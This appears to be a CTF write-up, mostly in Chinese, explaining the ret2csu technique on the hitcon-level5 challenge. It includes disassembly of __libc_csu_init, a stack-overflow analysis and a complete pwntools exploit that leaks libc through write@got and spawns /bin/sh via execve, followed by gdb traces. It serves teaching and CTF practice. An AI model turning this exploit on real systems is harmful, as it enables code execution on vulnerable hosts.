# ret2csu: level5

> challenge name: level5   https://ctf-wiki.org/pwn/linux/stackoverflow/medium-rop/   
>
> a demo for ret2csu, **hitcon-level5**
>
> file: level5, libc.so, libc.so.6.   .c .i64 provided at https://github.com/ctf-wiki/ctf-challenges/tree/master/pwn/stackoverflow/ret2__libc_csu_init/hitcon-level5
>
> writeup writer: hexhex16@outlook.com    https://github.com/hex-16
>
> refer writeup: https://ctf-wiki.org/pwn/linux/stackoverflow/medium-rop/

- ret2csu demo
- 利用 x64 下的 `__libc_csu_init` 中的 gadgets。这个函数用来对 libc 进行初始化操作，一般的程序都会调用 libc 函数，所以这个函数通常存在

重点看Post Analysis中1st csu的分析，理解怎么利用`__libc_csu_init`中的片段的

# ret2csu

`_libc_csu_init`函数 (不同版本的`_libc_csu_init`函数有一定的区别)

```assembly
.text:00000000004005C0 ; void _libc_csu_init(void)
.text:00000000004005C0                 public __libc_csu_init
.text:00000000004005C0 __libc_csu_init proc near               ; DATA XREF: _start+16o
.text:00000000004005C0                 push    r15
.text:00000000004005C2                 push    r14
.text:00000000004005C4                 mov     r15d, edi
.text:00000000004005C7                 push    r13
.text:00000000004005C9                 push    r12
.text:00000000004005CB                 lea     r12, __frame_dummy_init_array_entry
.text:00000000004005D2                 push    rbp
.text:00000000004005D3                 lea     rbp, __do_global_dtors_aux_fini_array_entry
.text:00000000004005DA                 push    rbx
.text:00000000004005DB                 mov     r14, rsi
.text:00000000004005DE                 mov     r13, rdx
.text:00000000004005E1                 sub     rbp, r12
.text:00000000004005E4                 sub     rsp, 8
.text:00000000004005E8                 sar     rbp, 3
.text:00000000004005EC                 call    _init_proc
.text:00000000004005F1                 test    rbp, rbp
.text:00000000004005F4                 jz      short loc_400616
.text:00000000004005F6                 xor     ebx, ebx
.text:00000000004005F8                 nop     dword ptr [rax+rax+00000000h]
.text:0000000000400600
.text:0000000000400600 loc_400600:             ; CODE XREF: __libc_csu_init+54j
.text:0000000000400600                 mov     rdx, r13 # x64 call 3rd para
.text:0000000000400603                 mov     rsi, r14 # x64 call 2nd para
.text:0000000000400606                 mov     edi, r15d # x64 call 1st para
.text:0000000000400609                 call    qword ptr [r12+rbx*8] # call # x64传参: RDI, RSI, RDX, RCX, R8, R9
.text:000000000040060D                 add     rbx, 1 # 这里将rbx + 1
.text:0000000000400611                 cmp     rbx, rbp # 故loc_400600执行前，rbx+1 = rbp 则会在jnz判定为相等 continue
.text:0000000000400614                 jnz     short loc_400600 # if ZF==0(即 rbx, rbp 不等) 跳转回前面 相等则不跳
.text:0000000000400616
.text:0000000000400616 loc_400616:            ; CODE XREF: __libc_csu_init+34j
.text:0000000000400616                 add     rsp, 8
.text:000000000040061A                 pop     rbx ; 从这到retn: 利用栈溢出构造栈上数据来控制 rbx,rbp,r12,r13,r14,r15
.text:000000000040061B                 pop     rbp
.text:000000000040061C                 pop     r12
.text:000000000040061E                 pop     r13
.text:0000000000400620                 pop     r14
.text:0000000000400622                 pop     r15
.text:0000000000400624                 retn ; gadget end 可以控制 rbx, rbp, r12, r13, r14, r15
.text:0000000000400624 __libc_csu_init endp
```

可以利用以下几点

- 从 `0x40061A` 到`400624 retn`，利用栈溢出构造栈上数据来控制 `rbx, rbp, r12, r13, r14, r15` 寄存器的数据
- 从 `0x400600` 到 `0x400609`，可以将`r13` 赋给 `rdx`, 将 `r14` 赋给 `rsi`，将 `r15d` 赋给 `edi`（虽然这里赋给的是 `edi`，**但其实此时 rdi 的高 32 位寄存器值为 0**，所以其实可以控制 `rdi` 寄存器的值，只不过只能控制低 32 位），而这三个寄存器，也是 x64 函数调用中传递参数的前三个寄存器。合理地控制 `r12` 与 `rbx`，可以调用想要调用的函数。比如说控制 `rbx` 为 0，`r12` 为存储想要调用的函数的地址，则`400609 call qword ptr [r12+rbx*8]` 相当于`call r12`
- 从 `0x40060D` 到 `0x400614`，可以控制 `rbx` 与 `rbp` 的之间的关系为 `rbx+1 = rbp`，这样就不会跳转到 `loc_400600`，而是继续执行。可以设置 `rbx=0, rbp=1`
- `400614 jnz`继续执行直至`400624 retn`，合理构造栈，使得`retn`时`rsp`指向特定地址，则会`retn(pop RIP)`到特定地址继续执行



# checksec

```bash
file level5
level5: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=45a4cee8f6bcc184507b3bea0f0c2e2d603650bd, not stripped
checksec --file=level5
[*] '/home/kali/CTF/pwn/level5/level5'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
```

- NX enabled   Partial RELRO

# IDA Analysis: vul function

```cpp
int __cdecl main(int argc, const char **argv, const char **envp)
{
  write(1, "Hello, World\n", 0xDuLL);
  vulnerable_function();
  return 0;
}
```

- 漏洞利用点在`vulnerable_function`中的read，存在栈溢出漏洞，且没有canary

```cpp
ssize_t vulnerable_function()
{
  char buf[128]; // [rsp+0h] [rbp-80h] BYREF
  return read(0, buf, 0x200uLL);  // 存在栈溢出漏洞，buf存储在栈上，而read限制 0x200远大于 buf实际长度0x80
}
```

- 后续分析中，将这个 `vulnerable_function` 简写为 **vul**

# Exploit

> test on kali 20.04, Python 3.9.2, pwntools 4.5.1

```python
from pwn import *
from LibcSearcher import LibcSearcher

context.log_level = 'debug'
level5 = ELF('./level5')
sh = process('./level5')

write_got = level5.got['write']
read_got = level5.got['read']
main_addr = level5.symbols['main']
bss_base = level5.bss()  # bbs段的起始地址
csu_front_addr = 0x0000000000400600  # csu .text:400600  mov rdx, r13
csu_pop2retn_addr = 0x000000000040061A  # pop rbx; pop rbp; pop r12;...


def csu(rbx, rbp, r12, r13, r14, r15, last):
    # pop rbx,rbp,r12,r13,r14,r15 # 40061A to 400624 # 然后会跳转到 400600 执行 到 400624
    # 40061A to 400624 to 400600 to 400624:
    # 1st para: edi = r15; 2nd para: rsi = r14; 3rd para: rdx = r13
    # call r12 (when rbx == 0)    # 具体分析过程见readme post analysis
    payload = b'a' * 0x80 + b'b' * 8  # 这个 b'b' * 8 覆盖在rbp处 用于gdb调试
    payload += p64(csu_pop2retn_addr)  # 这里覆盖的是 vulnerable_function 的返回地址
    payload += p64(rbx) + p64(rbp) + p64(r12) + p64(r13) + p64(r14) + p64(r15)
    payload += p64(csu_front_addr)
    payload += b'a' * 0x38
    payload += p64(last)
    sh.send(payload)
    sleep(1)


sh.recvuntil('Hello, World\n')
gdb.attach(sh, "b *0x40057F\nb *0x400586\n")  # 0x40057F call _read;  0x400586 retn in vul
# ===== 1st csu: write@got(1, write_got@got, 8)
# 向 stdout 写入 write@got 指向的内存地址上的8字节，即输出 write 的实际地址
csu(0, 1, write_got, 8, write_got, 1, main_addr)

write_addr = u64(sh.recv(8))  # write 的实际地址

libc = LibcSearcher('write', write_addr)  # 假定libc未知 但做题时一般在远程服务器运行 会给出libc
libc_base = write_addr - libc.dump('write')
execve_addr = libc_base + libc.dump('execve')

log.success('execve_addr ' + hex(execve_addr))

sh.recvuntil('Hello, World\n')
# ===== 2nd csu: read@got(0, bss_base, 16)  从stdin中输入16个字符，写入到bss_base中
# 然后输入 execve_addr, /bin/sh\x00
csu(0, 1, read_got, 16, bss_base, 0, main_addr)
sh.send(p64(execve_addr) + b'/bin/sh\x00')  # 发送了 8 + 8 = 16 个字符

sh.recvuntil('Hello, World\n')
# ===== 3rd csu: execve(bss_base+8)  i.e. execve("/bin/sh\0")
csu(0, 1, bss_base, 0, 0, bss_base + 8, 0)  # bss_base: execve; bss_base + 8: '/bin/sh\0'
sh.interactive()

```





# Post Analysis

> 后面写的csu有时表示python脚本中的`csu`函数，有时表示`_libc_csu_init`函数

## 1st csu

```python
# 1st cst调用时各个参数对应的值在备注中写上了
def csu(rbx, rbp, r12, r13, r14, r15, last):
    payload = b'a' * 0x80 + b'b' * 8 # leave执行完 rbp变成b'b' * 8 则说明payload中紧跟着的值会被覆盖到返回地址的位置上 具体原因查看function stack相关笔记
    payload += p64(csu_pop2retn_addr)  # 0x40061A 这里覆盖的是 vul 的返回地址，在 vul
    payload += p64(rbx) + p64(rbp) + p64(r12) + p64(r13) + p64(r14) + p64(r15)
          #    0,         1,      write_got,      8,     write_got,     1,
    payload += p64(csu_front_addr) # 0x400600  call前面的地址
    payload += b'a' * 0x38 # 0x38是为了第二次执行 csu 400624 retn; 时，rsp能够指向last
    payload += p64(last) # main_addr 0x400587
    sh.send(payload)
    sleep(1)
csu(0, 1, write_got, 8, write_got, 1, main_addr)
```

- payload :`[a...a] [b...b] [0x40061A] [0] [1] [write_got] [8] [write_got] [1] [0x400600] [a...a] [main_addr]`

```assembly
[DEBUG] Sent 0x108 bytes:
    00000000  61 61 61 61  61 61 61 61  61 61 61 61  61 61 61 61  │aaaa│aaaa│aaaa│aaaa│
    *
    00000080  62 62 62 62  62 62 62 62  1a 06 40 00  00 00 00 00  │bbbb│bbbb│··@·│····│
    00000090  00 00 00 00  00 00 00 00  01 00 00 00  00 00 00 00  │····│····│····│····│
    000000a0  18 10 60 00  00 00 00 00  08 00 00 00  00 00 00 00  │··`·│····│····│····│
    000000b0  18 10 60 00  00 00 00 00  01 00 00 00  00 00 00 00  │··`·│····│····│····│
    000000c0  00 06 40 00  00 00 00 00  61 61 61 61  61 61 61 61  │··@·│····│aaaa│aaaa│
    000000d0  61 61 61 61  61 61 61 61  61 61 61 61  61 61 61 61  │aaaa│aaaa│aaaa│aaaa│
    *
    00000100  87 05 40 00  00 00 00 00                            │··@·│····│
```
### Brief Process

1. `vul`中的`retn`会将`EIP`赋值为`40061a`
2. 跳转到`40061a`，执行到`csu`中的`400624 retn`，然后跳转到`csu: 400600` 去执行
3. `400600`会将step-2中被赋值的一些寄存器利用起来，修改掉`rdi, rsi, rdx`的值，然后`call write@got` i.e. `write(1, write_got, 8)` 将`write_got`指向的内存的数据写8个字节到`stdout`标准输出中。
4. `400614 jnz short loc_400600` 执行时，由于寄存器值的设计，不会跳转，继续执行，`40061a`到`retn`的指令会再执行一次
5. 第二次执行`400624 retn`，此时`rsp`指向的地址存储的值是`main`函数的地址，故会再次执行`main`
6. 回到`main`之后，相当于一切从0开始，可以多次`csu`

```assembly
; 1st csu 函数被调用时，csu中指令的效果分析：
.text:0000000000400600 loc_400600: ; csu_front_addr ; x64传参 RDI, RSI, RDX, RCX, R8, R9
.text:0000000000400600            mov     rdx, r13 # rdx = r13 = 8
.text:0000000000400603            mov     rsi, r14 # rsi = r14 = write_got
.text:0000000000400606            mov     edi, r15d # edi = r15d = r15 = 1
.text:0000000000400609            call    qword ptr [r12+rbx*8] #call r12 + rbx*8 = write_got + 0*8
.text:000000000040060D            add     rbx, 1 # rbx = rbx + 1 = 1
.text:0000000000400611            cmp     rbx, rbp # cmp 1, 1; then ZF=1
.text:0000000000400614            jnz     short loc_400600 # if ZF==0, jmp. so NOT jmp, continue
.text:0000000000400616
.text:0000000000400616 loc_400616:       ; CODE XREF: __libc_csu_init+34j
.text:0000000000400616            add     rsp, 8
.text:000000000040061A            pop     rbx ; csu_pop2retn_addr; vul retn后到这; rbx = 0
.text:000000000040061B            pop     rbp ; rbp = 1
.text:000000000040061C            pop     r12 ; r12 = write_got
.text:000000000040061E            pop     r13 ; r13 = 8
.text:0000000000400620            pop     r14 ; r14 = write_got
.text:0000000000400622            pop     r15 ; r15 = 1
.text:0000000000400624            retn ; pop EIP; i.e. EIP = 0x400600 跳转到 loc_400600 继续执行
.text:0000000000400624 __libc_csu_init endp
```

### retn in vul

在第一次调用`csu`时断下。`csu(0, 1, write_got, 8, write_got, 1, main_addr)`时，断在 vul 的 `retn` 上。重点看rsp此时的值

```assembly
$rsp  : 0x00007ffc14c02788 → 0x000000000040061a → <__libc_csu_init+90> pop rbx ; retn后该值赋给EIP
$rbp  : 0x6262626262626262 ("bbbbbbbb"?) ; payload的 b'b'*8 可在调试中查看rbp的值有没被准确覆盖; 如果leave执行完这里变成b'b' * 8 则说明payload中紧跟着的值会被覆盖到返回地址的位置上 
──────────────────────── stack ──── ; call read执行结束之后 栈上的内容被覆盖了 ↓
0x00007ffc14c02788│+0x0000: 0x000000000040061a → <__libc_csu_init+90> pop rbx ← $rsp; rsp在retn前的值为0x00007ffc14c02788, 指向的内存的值为0x40061a，是csu中的地址，即 csu_pop2retn_addr的值。retn相当于pop EIP，即 EIP = 0x40061a, rsp += 8
0x00007ffc14c02790│+0x0008: 0x0000000000000000 ; after retn, rsp point to here. pop rbx; i.e. rbx = 0 (实际上还有 rsp += 8, 这里省略)
0x00007ffc14c02798│+0x0010: 0x0000000000000001 ; pop rbp; i.e. rbp = 1 ; next inst: pop r12; i.e. r12 = write_got
0x00007ffc14c027a0│+0x0018: 0x0000000000601018 → 0x00007f5537cadf20 → <write+0> mov eax, DWORD PTR fs:0x18 
0x00007ffc14c027a8│+0x0020: 0x0000000000000008 ; pop r13; i.e. r13 = 8 ; next inst: pop r14; i.e. r14 = write_got
0x00007ffc14c027b0│+0x0028: 0x0000000000601018 → 0x00007f5537cadf20 → <write+0> mov eax, DWORD PTR fs:0x18 
0x00007ffc14c027b8│+0x0030: 0x0000000000000001 ; pop r15; i.e. r15 = 1
0x00007ffc14c027c0│+0x0038: 0x0000000000400600 → <__libc_csu_init+64> mov rdx, r13; retn; pop EIP; EIP = 0x400600
────────────────────────────────────────────── code:x86:64 ──── ; 断在了 vul 的 retn 处
     0x400584 <vulnerable_function+30> nop
     0x400585 <vulnerable_function+31> leave ; mov rsp, rbp; pop rbp; 如果rsp在执行前指向bbbbbbbb，则rbp=bbbbbbbb
●→   0x400586 <vulnerable_function+32> ret
   ↳    0x40061a <__libc_csu_init+90> pop    rbx
        0x40061b <__libc_csu_init+91> pop    rbp
        0x40061c <__libc_csu_init+92> pop    r12
        0x40061e <__libc_csu_init+94> pop    r13
        0x400620 <__libc_csu_init+96> pop    r14
        0x400622 <__libc_csu_init+98> pop    r15 ; 再后面一条指令是 retn
─────────────────────────────────────────────────────────── trace ────
[#0] 0x400586 → vulnerable_function()
[#1] 0x40061a → __libc_csu_init()
```

### 0x400609 call in csu

`gdb: si` 进`0x40061a`后，一步步`ni... si... ni` 到`csu: .text:400614 jnz short loc_400600`时的寄存器，栈如下。这里的栈可以分析出下次执行`csu .text:400624 retn`时，`pop rip`时rsp指向的地址。

```assembly
; 断在csu 400609 call qword ptr [r12+rbx*8]; 部分输出删去
$rbx   : 0x0               ; rbx = 0
$rdx   : 0x8               ; rdx = 8; i.e. 3rd para = 8
$rsp   : 0x00007ffc14c027c8 → "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa[...]"
$rbp   : 0x1               
$rsi   : 0x0000000000601018 → 0x00007f5537cadf20 → <write+0> mov eax, DWORD PTR fs:0x18 ; rsi = 601018 0x00007f5537cadf20 为write的实际地址 i.e. 2nd para = actual addr of write
$rdi   : 0x1               ; rdi = 1; i.e. 1st para = stdout
$rip   : 0x0000000000400609  →  <__libc_csu_init+73> call QWORD PTR [r12+rbx*8]
$r12   : 0x0000000000601018 → 0x00007f5537cadf20 → <write+0> mov eax, DWORD PTR fs:0x18; r12 = 601018(.got.plt:601018 off_601018 dq offset write), 存储的值为write的实际地址. i.e. call write@got
$r13   : 0x8               
$r14   : 0x0000000000601018  →  0x00007f5537cadf20  →  <write+0> mov eax, DWORD PTR fs:0x18
$r15   : 0x1
──────────────────── stack ─── ; 执行完 call QWORD PTR [r12+rbx*8] 之后 rsp 不变
0x00007ffc14c027c8│+0x0000: "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa[...]"  ← $rsp
0x00007ffc14c027d0│+0x0008: 0x6161616161616161 ; call 后面的 add rsp, 8; 执行完后 rsp 指向这
0x00007ffc14c027d8│+0x0010: 0x6161616161616161 ; 而后有6个pop rsp会6次 += 8
0x00007ffc14c027e0│+0x0018: 0x6161616161616161
0x00007ffc14c027e8│+0x0020: 0x6161616161616161
0x00007ffc14c027f0│+0x0028: 0x6161616161616161
0x00007ffc14c027f8│+0x0030: 0x6161616161616161
0x00007ffc14c02800│+0x0038: 0x0000000000400587  →  <main+0> push rbp ; 到执行 400624 retn 时rsp指向这
─────────────────────────────────────────────────────────────────────── code:x86:64 ────
     0x400606 <__libc_csu_init+70> mov    edi, r15d
 →   0x400609 <__libc_csu_init+73> call   QWORD PTR [r12+rbx*8] ; 断在csu 0x400609 call指令处
     0x40060d <__libc_csu_init+77> add    rbx, 0x1
─────────────────────────────────────────────────────────────── arguments (guessed) ────
*[r12+rbx*8] (
   $rdi = 0x0000000000000001,
   $rsi = 0x0000000000601018 → 0x00007f5537cadf20 → <write+0> mov eax, DWORD PTR fs:0x18,
   $rdx = 0x0000000000000008
)
```

- 从栈可以看到，执行完 `csu:  0x400609 call`之后，`rsp`指向`0x00007ffc14c027c8`，后面会有1次`add rsp, 8`, 6次`pop`，故`rsp`会`+=0x38`，然后再执行`400624 retn`，将`0x00007ffc14c02800`指向的值赋值给`rip`
- `0x38`分析方式2：`gdb ni`到`400624 retn`，看`rsp`的值与`400609 call`的`rsp`的值的差值。

## 2nd csu

```python
csu(0, 1, read_got, 16, bss_base, 0, main_addr)
sh.send(p64(execve_addr) + b'/bin/sh\x00')  # 发送了 8 + 8 = 16 个字符
```

- 相当于执行了

```python
read@got(0, bss_base, 16) # 从stdin中输入16个字符，写入到 bss_base 中 
# 输入了 p64(execve_addr)  '/bin/sh\x00' # p64(execve_addr)存在bss_base, '/bin/sh\x00'存在bss_base+8
```

- 最后回到`main`中

## 3rd csu

- 此时`bss_base`存储的是`execve`函数的地址，`bss_base + 8`存储的是`'/bin/sh\x00'`

```python
csu(0, 1, bss_base, 0, 0, bss_base + 8, 0) # bss_base: execve; bss_base + 8: '/bin/sh\0'
```

- 相当于执行的是`execve("/bin/sh\0")`

getshell sucess!

